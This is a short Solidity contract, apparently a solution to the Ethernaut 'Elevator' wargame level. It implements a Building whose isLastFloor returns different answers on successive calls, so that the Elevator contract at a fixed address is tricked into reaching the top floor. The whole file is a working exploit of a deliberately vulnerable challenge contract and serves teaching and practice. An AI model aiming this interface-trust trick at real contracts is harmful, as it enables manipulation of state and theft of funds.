// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract MaliciousBuilding {
  bool public _isLastFloor;
  Elevator public elevator;

  constructor() public {
      elevator = Elevator(0x031e28Aa62614b159d190A060b29341015Dea176);
  }

  function isLastFloor(uint _floor) public returns (bool) {
      bool _isLastFloor2 = _isLastFloor;
      _isLastFloor = true;
      return _isLastFloor2;
  }

  function goTo() public {
      elevator.goTo(1);
  }
}